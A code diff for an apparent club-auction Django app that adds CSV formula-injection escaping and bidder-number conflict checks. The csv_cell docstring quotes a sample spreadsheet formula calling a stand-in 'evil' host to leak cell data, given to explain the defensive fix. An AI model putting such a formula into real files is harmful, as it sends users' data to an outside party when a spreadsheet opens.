@@ -28,6 +28,47 @@ def attachment_filename(value, fallback="download"):
     return cleaned[:80] or fallback
 
 
+#: Characters a spreadsheet treats as the start of a formula, plus the two whitespace characters
+#: Excel skips before deciding.
+_CSV_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
+
+
+def csv_cell(value):
+    """One CSV cell, safe to open in a spreadsheet.
+
+    Excel, Sheets and LibreOffice run a cell beginning ``=``, ``+``, ``-`` or ``@`` as a formula, so
+    a lot named ``=HYPERLINK("https://evil/"&A1,"Open")`` fires when an organizer opens the export.
+    Prefixing a single quote makes it text; the quote is not shown in the cell.
+    """
+    if value is None:
+        return ""
+    text = str(value)
+    if text.startswith(_CSV_FORMULA_PREFIXES):
+        return "'" + text
+    return text
+
+
+def csv_writer(fileobj, **kwargs):
+    """``csv.writer`` that puts every cell through :func:`csv_cell`.
+
+    A wrapper rather than escaping at each ``writerow``: there are nine exports and the next one
+    should not have to remember.
+    """
+    import csv as _csv
+
+    writer = _csv.writer(fileobj, **kwargs)
+
+    class _SafeWriter:
+        def writerow(self, row):
+            return writer.writerow([csv_cell(cell) for cell in row])
+
+        def writerows(self, rows):
+            for row in rows:
+                self.writerow(row)
+
+    return _SafeWriter()
+
+
 def map_fields(data: dict, api_key) -> dict:
     """Rename incoming keys by this key's ClubAPIKeyFieldMap; ``first_name``/``last_name`` become ``name``
     unless ``name`` is set.
@@ -258,6 +299,76 @@ def club_managed_auctions_for(club):
     )
 
 
+def member_holding_bidder_number(club, number, *, exclude_member=None):
+    """The other ``ClubMember`` in *club* with bidder *number*, or ``None``.
+
+    Soft-deleted members are included on purpose: they keep their number, the writers below displace
+    them by it, and reactivating one must not produce a duplicate.
+    """
+    number = (number or "").strip()
+    if not number or club is None:
+        return None
+    members = ClubMember.objects.filter(club=club, bidder_number=number)
+    if exclude_member is not None and exclude_member.pk:
+        members = members.exclude(pk=exclude_member.pk)
+    return members.first()
+
+
+def bidder_number_conflict(number, *, auction=None, club=None, exclude_member=None, exclude_tos=None):
+    """Who already holds bidder *number* in the scope it is about to occupy, or ``None``.
+
+    The one definition of "taken" for form validation. There is no database constraint to lean on:
+    MariaDB silently creates nothing for a conditional ``UniqueConstraint`` (Django's W036), so the
+    rule has to be checked before the write. Generation checks the same scopes -- see
+    :func:`free_bidder_number_for`.
+
+    Which scope applies follows who owns the number:
+
+    * An **unmanaged auction** owns its own numbers, so only its other ``AuctionTOS`` rows matter.
+    * A **club-managed** auction doesn't -- the ``ClubMember`` owns it, and it is copied to a shadow
+      row in every club-managed auction. So the club's members are checked too, or a number free in
+      this auction alone would displace somebody the next time the member syncs.
+
+    A member's own shadow rows never count against them. Returns the ``ClubMember`` or ``AuctionTOS``
+    holding the number, so the caller can name them.
+    """
+    number = (number or "").strip()
+    if not number:
+        return None
+
+    member = exclude_member or getattr(exclude_tos, "clubmember", None)
+    # Only consult the club when the number really is club-owned; an unmanaged auction that happens
+    # to belong to a club keeps its numbers to itself.
+    if club is None and auction is not None and auction.is_club_managed:
+        club = auction.club
+    if club is None and member is not None:
+        club = member.club
+
+    holder = member_holding_bidder_number(club, number, exclude_member=member)
+    if holder:
+        return holder
+
+    if auction is not None:
+        rows = AuctionTOS.objects.filter(auction=auction, bidder_number=number)
+    elif club is not None:
+        rows = AuctionTOS.objects.filter(auction__in=club_managed_auctions_for(club), bidder_number=number)
+    else:
+        return None
+    if exclude_tos is not None and exclude_tos.pk:
+        rows = rows.exclude(pk=exclude_tos.pk)
+    if member is not None and member.pk:
+        rows = rows.exclude(clubmember_id=member.pk)
+    return rows.select_related("clubmember").first()
+
+
+def bidder_number_taken_message(holder):
+    """The form error for a :func:`bidder_number_conflict` holder, naming them where we can."""
+    name = (getattr(holder, "name", "") or "").strip()
+    if isinstance(holder, ClubMember):
+        return f"{name or 'Another member'} already has this bidder number in this club"
+    return f"{name or 'Somebody else'} already has this bidder number in this auction"
+
+
 def club_managed_shadows_for(member):
     """Every ``AuctionTOS`` that is *member*, across club-managed auctions, finished ones included.
 
@@ -274,8 +385,13 @@ def _member_auction_ids(member):
     return list(club_managed_shadows_for(member).values_list("auction_id", flat=True))
 
 
-def free_bidder_number_for(member, *, avoid=()):
-    """A bidder number free in *member*'s club and every auction they're in. *avoid* counts as taken."""
+def free_bidder_number_for(member, *, avoid=(), preferred=None):
+    """A bidder number free in *member*'s club and every auction they're in. *avoid* counts as taken.
+
+    *preferred* seeds the search when the member has no number yet -- their account's
+    ``preferred_bidder_number``. Their current number always wins over it, so renumbering a member
+    who already has one displaces as few people as possible.
+    """
     from .models import _generate_unique_bidder_number
 
     avoid = {str(value).strip() for value in avoid if str(value).strip()}
@@ -299,7 +415,7 @@ def free_bidder_number_for(member, *, avoid=()):
     return _generate_unique_bidder_number(
         is_taken=is_taken,
         # Keep their existing number when still free: displace people as little as possible.
-        preferred=(member.bidder_number or "").strip() or None,
+        preferred=(member.bidder_number or "").strip() or preferred or None,
         phone=member.phone_number,
         address=member.address,
     )
@@ -355,7 +471,9 @@ def set_member_bidder_number(member, number, *, acting_user=None, _seen=None):
     if member.pk in _seen:
         return
     _seen.add(member.pk)
-    # Club scope first: (club, bidder_number) is a database unique constraint.
+    # Club scope first. Nothing in the database enforces this -- a conditional UniqueConstraint
+    # creates no index on MariaDB (W036) -- so displacing the current holder here, and rejecting in
+    # the forms (services.bidder_number_conflict), is the whole of the rule.
     for other in ClubMember.objects.filter(club_id=member.club_id, bidder_number=number).exclude(pk=member.pk):
         set_member_bidder_number(
             other, free_bidder_number_for(other, avoid=[number]), acting_user=acting_user, _seen=_seen
